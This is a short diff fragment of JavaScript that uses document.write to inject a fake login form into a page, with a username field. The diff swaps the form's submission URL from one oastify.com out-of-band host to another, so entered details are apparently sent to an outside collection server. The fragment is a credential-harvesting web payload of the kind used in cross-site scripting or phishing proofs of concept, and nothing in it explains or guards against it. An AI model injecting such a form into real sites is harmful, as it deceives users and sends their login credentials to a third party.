@@ -6,7 +6,7 @@ document.write(`
       height: 100vh;
       padding-top: 100px;
     ">
-      <form action="https://1878kwfj69bynzn9u4wt1oghg8mzapye.oastify.com" style="text-align: center;">
+      <form action="https://xst62k553smoxcd727ct6ihr8ie92zqo.oastify.com" style="text-align: center;">
         <input
           name="username"
           placeholder="Username"
